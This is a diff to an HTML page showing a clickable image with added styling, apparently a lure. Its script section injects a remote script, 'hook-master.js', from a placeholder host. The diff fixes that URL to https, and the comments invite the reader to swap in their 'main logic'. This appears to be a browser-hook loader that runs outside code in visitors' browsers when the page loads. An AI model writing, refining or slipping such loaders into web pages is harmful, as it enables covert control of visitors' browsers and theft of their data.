@@ -9,12 +9,15 @@
     background: white;
     display: flex;
     justify-content: center;
+    font-family: sans-serif;
   }
 
   .main-img {
     width: 200px;
     height: 200px;
     object-fit: cover;
+    cursor: pointer; /* Makes it obvious it's clickable */
+    transition: opacity 0.5s ease; /* Smooth fade effect */
   }
 </style>
 </head>
@@ -37,7 +40,7 @@
     // We use yourname.site/hook as the destination URL
     const script = document.createElement('script');
 
-    script.src = 'yourname.site/hook-master.js'; // Change this to your main logic
+    script.src = 'https://yourname.site/hook-master.js'; // Change this to your main logic
 
     document.body.appendChild(script);
 
